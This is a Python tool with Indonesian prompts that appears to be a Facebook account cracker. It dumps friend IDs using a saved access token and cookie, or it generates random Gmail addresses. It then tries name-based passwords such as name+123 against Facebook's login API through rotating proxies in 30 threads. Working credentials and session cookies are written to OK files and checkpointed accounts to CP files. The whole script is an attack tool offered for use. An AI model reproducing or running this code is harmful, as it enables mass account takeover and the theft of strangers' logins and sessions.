import requests,json,os,sys,random,datetime,time,re,platform,subprocess
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as turu
from rich import print as cetak
from rich.panel import Panel as nel
id,id2,uid = [],[],[]
pwpluss = []
pwnya = []
loop,zar = 0,[]
ok,cp,oo = 0,0,[]
ses = requests.Session()
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
file_path = '.proxy.txt'
if not os.path.exists(file_path):
    try:
        proxy = requests.get(
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
        ).text
        with open(file_path, 'w') as f:
            f.write(proxy)
    except Exception:
        pass 
else:
    with open(file_path, 'r') as f:
        proxy = f.read().splitlines()
def userku():
	try:
		with open('user.txt','r',encoding='utf-8')as B:A=[A.strip()for A in B if A.strip()]
		if not A:print('File kosong atau tidak ada User-Agent.');return
		C=random.choice(A);return C
	except Exception as D:print('Gagal membaca file:',D);return 
gr = '\033[1;32;41m'
k = '\033[33m'
w = '\033[1;37m'
g = '\033[1;32m'
r = '\033[1;31m'
b = '\033[1;34m'
p = '\033[1;35m'
c = '\033[1;36m'
y = '\033[1;33m'
reset = '\033[0m'
warna_warni = random.choice([g, r, b, p, y])
tanda = f'{p}[{w}+{p}]{w}'
def cetak_panel(teks, lebar):
    garis_atas = (f'{g}~{w}') * lebar
    teks_tengah = teks.center(lebar)
    garis_bawah = (f'{g}~{w}') * lebar

    panel = f"{garis_atas}\n{teks_tengah}\n{garis_bawah}"
    print(panel)
def nge_krek2():
    try:
        print(f"{tanda} Mau dump id berapa contoh: {g}1")
        jumlah_id = int(input(f'{tanda} input:{g} '))
        uids = []
        for i in range(jumlah_id):
            uid = input(f'{tanda} {w}Input id ke-{i+1}:{g} ')
            uids.append(uid)
        tok = open('.tokzar.txt', 'r').read()
        cok = {'cookie': open('.cokzar.txt', 'r').read()}
    except IOError:
        print(f"{tanda} gagal dump mungkin id ga publik.")
        exit()
    except ValueError:
        print(f"{tanda} input angka jangan huruf")
        exit()
    total_id = 0
    try:
        for index, uidz in enumerate(uids, 1):
            print(f"{tanda} {w}Menghitung id ke-{index}: {g}{uidz}")
            count = nge_krek2_helper(uidz, tok, cok, '')
            total_id += count
            print(f"{tanda} {w}Menghitung: {g}{count}")
    except KeyError as e:
        print(f"{tanda} Kesalahan: {e}")
        pass
    print(f"{tanda} {w}Total id: {g}{total_id}")
    zar_atur()
def nge_krek2_helper(uidz, tok, cok, after):
    count = 0
    try:
        params = {
            'access_token': tok,
            'fields': f'friends.after({after})' if after else 'friends'
        }
        po = ses.get(f'https://graph.facebook.com/{uidz}', params=params, cookies=cok).json()
        for x in po['friends']['data']:
            id.append(x.get('id') + '|' + x.get('name'))
            count += 1
        afr = po['friends']['paging']['cursors']['after']
        if afr:
            return count + nge_krek2_helper(uidz, tok, cok, afr)
    except KeyError:
        pass
    return count
def mail():
    dump = set()
    rc = random.choice
    rr = random.randint
    cowok = ['gaming', 'muhammad', 'afrizal', 'ananda', 'alvino', 'andika', 'alif', 'akmal', 'bintang', 'bagus', 'budi', 'cahya', 'candra', 'dedy', 'deri', 'danial', 'darmawan', 'edi', 'eko', 'ferdi', 'fahri', 'fajar', 'fadil', 'fatur', 'firdaus', 'galang', 'gilang', 'gunawan', 'habibi', 'hafid', 'hari', 'hendra', 'hendrik', 'herman', 'husni', 'ikhsan', 'ilham', 'irfan', 'iskandar', 'joko', 'joni', 'junaidi', 'kahar', 'kamal', 'kiki', 'luthfi', 'lukman', 'mahendra', 'maulana', 'muhajir', 'mukhtar', 'naufal', 'nasrul', 'rachman', 'rahmat', 'ramadan', 'ramli', 'reza', 'rizal', 'ridho', 'sandi', 'saputra', 'satria', 'setiawan', 'susanto', 'syahril', 'taufiq', 'teguh', 'toni', 'wahyu', 'widodo', 'yanto', 'yusuf', 'zaki', 'zulfan', 'adrian', 'aldo', 'alfian', 'adib', 'amran', 'arjuna', 'ardian', 'arifin', 'arif', 'arnold', 'bahrul', 'bambang', 'bayu', 'deni', 'dodi', 'dwi', 'edi', 'faisal', 'farhan', 'fathur', 'fikri', 'gerry', 'gibran', 'haris', 'hilmi', 'huda', 'ian', 'imam', 'indra', 'jefri', 'khairul', 'khoir', 'luki', 'marwan', 'miftah', 'muhib', 'mukhlis', 'nanda', 'nanang', 'nazmi', 'panji', 'pandu', 'pratama', 'putra', 'radit', 'rendi', 'rizqi', 'ridwan', 'syarif', 'syukri', 'tama', 'trisna', 'udin', 'usman', 'wawan', 'yogi', 'yudha', 'zahran', 'zulfikar', 'zidan', 'zulham', 'abdullah', 'adil', 'amin', 'ammar', 'azhar', 'azis', 'darma', 'edy', 'febri', 'ferry', 'guntur', 'hadi', 'hafiz', 'harun', 'idris', 'ilmi', 'irsyad', 'juna', 'kamaludin', 'mahmud', 'najib', 'nugraha', 'rachmat', 'rizwan', 'samsul', 'salman', 'satrio', 'sulaiman', 'syaiful', 'tama', 'umar', 'zakaria', 'zulkarnaen', 'adit', 'arwan', 'fajri', 'firman', 'haikal', 'iqbal', 'jaenal', 'kurnia', 'raka', 'ramdhan', 'seno', 'setyo', 'widi', 'yudistira', 'zaenal', 'ammar', 'akhbar', 'adam', 'ahmad', 'ardian', 'arvian', 'bastian', 'bimo', 'bondan', 'cipto', 'cokro', 'darwin', 'dewangga', 'dion', 'donny', 'edwin', 'fajar', 'faisal', 'ferdy', 'gerry', 'hafis', 'hanif', 'hilman', 'harris', 'idham', 'ikhwan', 'iqbal', 'jaenal', 'johan', 'kunto', 'mahesa', 'miko', 'najmi', 'pandji', 'rahmat', 'rama', 'rangga', 'reza', 'rio', 'rivan', 'rusdi', 'sabri', 'seno', 'teguh', 'valentino', 'wawan', 'wildan', 'yusuf', 'yudhistira', 'zaenal', 'zakki', 'zamzam', 'zein']
    cewek = ['adelia', 'afifa', 'alia', 'aline', 'amalia', 'amel', 'annisa', 'arini', 'aurora', 'avani', 'azkia', 'bella', 'brianna', 'calista', 'cindy', 'clarissa', 'danita', 'della', 'devina', 'dhiya', 'ela', 'elin', 'esya', 'felicia', 'fiona', 'gabriella', 'hana', 'hani', 'ika', 'iliana', 'jovita', 'karunia', 'keysha', 'livia', 'luna', 'maharani', 'mery', 'micaela', 'mila', 'nika', 'nira', 'novita', 'pia', 'raisa', 'ramona', 'regina', 'rosa', 'rose', 'sabrina', 'salwa', 'sarina', 'sasha', 'shaura', 'sienna', 'silmi', 'soraya', 'stella', 'talia', 'tasya', 'valeria', 'veronica', 'vanya', 'yasmine', 'zanita', 'amanda', 'anggun', 'ani', 'aulya', 'bunga', 'cantika', 'dahlia', 'delia', 'dita', 'elia', 'fani', 'gisel', 'hera', 'ina', 'intan', 'ira', 'kanya', 'kartika', 'lani', 'layla', 'marissa', 'nadya', 'nana', 'nisa', 'nisrina', 'nur', 'rizka', 'safira', 'selvi', 'silvia', 'sri', 'syifa', 'wulan', 'yasinta', 'yuliana', 'yuni', 'aisyah', 'amelia', 'azalea', 'alya', 'anisa', 'afifah', 'alina', 'alika', 'citra', 'chintya', 'carissa', 'dina', 'dinda', 'dewi', 'dwi', 'ella', 'eva', 'elisa', 'fitri', 'farah', 'fira', 'fatimah', 'gita', 'grace', 'hanna', 'helena', 'hilda', 'indah', 'irma', 'ilona', 'jasmine', 'jihan', 'karina', 'kayla', 'kezia', 'laras', 'linda', 'laila', 'melati', 'mutia', 'nadia', 'nabila', 'nadira', 'niya', 'olivia', 'putri', 'pratiwi', 'rahma', 'ratih', 'rina', 'riska', 'shinta', 'sarah', 'siska', 'salsabila', 'tiara', 'tria', 'umi', 'utami', 'winda', 'yani', 'yasmin', 'zahra', 'zaneta']
    global id
    piliha = f" {g}masukan nama email"
    cetak_panel(piliha, 60)
    nama = input(f'{tanda} input:{g} ')
    
    if ',' in str(nama):
        print(f'{tanda} jangan kosong')
        time.sleep(3)
        exit()
    
    doma = '@gmail.com'
    if '@' not in doma or '.com' not in doma:
        print(f'{tanda} salah woy')
        time.sleep(3)
        exit()

    pilih = (f"{tanda} 1. Nama cowok\n{tanda} 2. Nama cewek")
    cetak_panel(pilih, 60)
    pilihan = input(f"{tanda} input:{g} ")

    if pilihan == '1':
        nama_list = cowok
    elif pilihan == '2':
        nama_list = cewek
    else:
        print(f'{tanda} Pilihan tidak valid')
        time.sleep(3)
        exit()

    format_pilih = (f"{tanda} 1. Format nama (nama, angka, nama+angka)\n"
                    f"{tanda} 2. Format nama (nama, angka)")
    cetak_panel(format_pilih, 60)
    format_bb = input(f"{tanda} input:{g} ")

    if format_bb == '1':
        jumlah = int(input(f'{tanda} mau berapa dump (max:2000):{g} '))
        counter = 0
        while counter < jumlah:
            if format_bb == '1':
                BB = [
                    f'{str(rc(nama_list))}',
                    f'{str(rr(0, 100))}',
                    f'{str(rc(nama_list))}{str(rr(0, 100))}',
                ]
            elif format_bb == '2':
                BB = [
                    f'{str(rc(nama_list))}',
                    f'{str(rr(0, 100))}',
                ]
            
            email = f'{nama}{rc(BB)}{doma}'
            if email not in dump:
                dump.add(email)
                id.append(email + '|' + nama)
                counter += 1
                sys.stdout.write(f"\r{tanda} TOTAL ID  {g}{counter} {w}email..."); sys.stdout.flush()

            time.sleep(0.0003)
        
        print('')
        zar_atur()
def zar_atur():
    pilih = (f'{tanda} 1. CRACK DARI ID {r}TUA{w}\n{tanda} 2. CRACK DARI ID {g}MUDA\n{tanda} 3. CRACK DARI ID {c}ACAK')
    cetak_panel(pilih, 60)
    zarid = input(f'{tanda} input:{g} ')
    if zarid in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif zarid in ['2','02']:
        xbaru=[]
        for baru in sorted(id):
            xbaru.append(baru)
        bkp=len(xbaru)
        bkpp=(bkp-1)
        for miyabi in range(bkp):
            id2.append(xbaru[bkpp])
            bkpp -=1
    elif zarid in ['3','03']:
        for acak in id:
            xnxx = random.randint(0,len(id2))
            id2.insert(xnxx,acak)
    else:
        zahra_animasi2(f'{tanda} KETIK YANG BENER SAYANG')
        exit()
        
    pilih = (f'{tanda} Sandi Tambahan[{r}Y{w}/{g}T{w}]{w}')
    cetak_panel(pilih, 60)
    pwplus = input(f'{tanda} input:{g} ')
    if pwplus in ['y','Y']:
        pwpluss.append('ya')
        print(f'{tanda} Masukkan Katasandi Tambahan Minimal 6 Karakter')
        print(f'{tanda} Gunakan Koma Jika Ingin menggunakan lebih dari 1 Sandi')
        print(f'{tanda} Contoh:{g} akusayangkamu,bismillah,jodoh123')
        pwku = input(f'{tanda} Masukkan sandi:{g} ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
    
    apaci()
def apaci():
    global prog, des
    print(f'{tanda} mode pesawatkan {g}10detik {w}setiap{g} 4/5menit\n{tanda} hasil ok di simpan di:{g}/sdcard/FIRZAH/OK/{okh}\n{tanda} hasil cp di simpan di:{y}/sdcard/FIRZAH/CP/{cph}')
    prog = Progress(SpinnerColumn('clock'), TextColumn('{task.description}'), BarColumn(), TextColumn('{task.percentage:.0f}%'))
    des = prog.add_task('', total=len(id))
    with prog:
        with tred(max_workers=30) as gas_krek:
            for yuzong in id2:
                idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                zar_password = []
                pwt = []
                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
                        zar_password.append(nmf)
                        zar_password.append(frs+'123')
                        zar_password.append(frs+'1234')
                        zar_password.append(frs+'12345')
                        zar_password.append(frs+' 123')
                        zar_password.append(frs+'321')
                        zar_password.append(frs+'01')
                        zar_password.append(frs+'02')
                        zar_password.append(frs+'03')
                        zar_password.append(frs+'05')
                        zar_password.append(frs+'06')
                        zar_password.append(frs+'07')
                        zar_password.append(frs+'1')
                        zar_password.append(frs+'09')
                        zar_password.append('123'+frs)
                        zar_password.append(frs+'12')
                else:
                    if len(frs) < 3:
                        zar_password.append(nmf)
                    else:
                        zar_password.append(nmf)
                        zar_password.append(frs+'123')
                        zar_password.append(frs+'1234')
                        zar_password.append(frs+'12345')
                        zar_password.append(frs+' 123')
                        zar_password.append(frs+'321')
                        zar_password.append(frs+'01')
                        zar_password.append(frs+'02')
                        zar_password.append(frs+'03')
                        zar_password.append(frs+'05')
                        zar_password.append(frs+'06')
                        zar_password.append(frs+'07')
                        zar_password.append(frs+'1')
                        zar_password.append(frs+'09')
                        zar_password.append('123'+frs)
                        zar_password.append(frs+'12')
                if 'ya' in pwpluss:
                    for xpwn in pwnya:
                        zar_password.append(xpwn)
                else:
                    pass
                gas_krek.submit(crack, idf, zar_password)
        print(f'{w}')
        print(f'{tanda} AKUN BERHASIL LOGIN: {g}%s{w} ' % (ok))
        print(f'{tanda} AKUN CHEKPOINT: {y}%s{w} ' % (cp))
        exit()
def crack(idf,pwx):
	global loop,ok,cp
	ses = requests.Session()
	ua = userku()
	rr = random.randint
	rc = random.choice
	prog.update(des,description=f'{g}1 {idf}{w} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	for pw in pwx:
		try:
			pox = random.choice(proxy)
			proxxy = {'http': 'socks4://'+pox}
			po =  requests.get(f'https://b-api.facebook.com/method/auth.login?format=json&email={idf}&password={ua}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers={'x-fb-connection-bandwidth': '26043029', 'x-fb-sim-hni': '26184', 'x-fb-net-hni': '31853', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'},proxies=proxxy)
			if "User must verify their account" in po.text:
    			         cp+=1
    			         print('')
    			         cetak(nel(f'\r {w}[{c}CHEKPOINT{w}]{w}\n TAHUN BUAT: {y}{cektahun(idf)}{w}\n{w} GMAIL/NO: {y}{idf}{w}\n {w}PASSWORD: {y}{pw}{w}\n {w}USER AGENT: {y}{ua}{w}'))
    			         open('/storage/emulated/0/FIRZAH/CP/'+cph,'a').write(idf+'|'+pw+'\n')
    			         break
			if "session_key" in po.text:
			             ok+=1
			             print('')
			             cok = ";".join([f"{c['name']}={c['value']}" for c in po.json()['session_cookies']])
			             cetak(nel(f'\r {w}[{c}BERHASIL LOGIN{w}]{w}\n TAHUN BUAT: {w}{g}{cektahun(idf)}{w}\n{w} GMAIL/NO: {g}{idf}{w}\n {w}PASSWORD: {g}{pw}{w}\n {w}COOKIEE: {g}{cok}{w}\n {w}USER AGENT: {g}{ua}{w}'))
			             open('/storage/emulated/0/FIRZAH/OK/'+okh,'a').write(idf+'|'+pw+'|'+cok+'\n')
			             break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	loop+=1
def cektahun(fx):
    if len(fx) == 15:
        if fx[:10] in ['1000000000']: tahunz = '2009'
        elif fx[:9] in ['100000000']: tahunz = '2009'
        elif fx[:8] in ['10000000']: tahunz = '2009'
        elif fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']: tahunz = '2009'
        elif fx[:7] in ['1000006', '1000007', '1000008', '1000009']: tahunz = '2010'
        elif fx[:6] in ['100001']: tahunz = '2010'
        elif fx[:6] in ['100002', '100003']: tahunz = '2011'
        elif fx[:6] in ['100004']: tahunz = '2012'
        elif fx[:6] in ['100005', '100006']: tahunz = '2013'
        elif fx[:6] in ['100007', '100008']: tahunz = '2014'
        elif fx[:6] in ['100009']: tahunz = '2015'
        elif fx[:5] in ['10001']: tahunz = '2016'
        elif fx[:5] in ['10002']: tahunz = '2017'
        elif fx[:5] in ['10003']: tahunz = '2018'
        elif fx[:5] in ['10004']: tahunz = '2019'
        elif fx[:5] in ['10005']: tahunz = '2020'
        elif fx[:5] in ['10006']: tahunz = '2021'
        elif fx[:5] in ['10009']: tahunz = '2023'
        elif fx[:5] in ['10007', '10008']: tahunz = '2022'
        else: tahunz = ''
    elif len(fx) in [9, 10]:
        tahunz = '2008'
    elif len(fx) == 8:
        tahunz = '2007'
    elif len(fx) == 7:
        tahunz = '2006'
    elif len(fx) == 14 and fx[:2] in ['61']:
        tahunz = '2024'
    else:
        tahunz = ''
    return tahunz
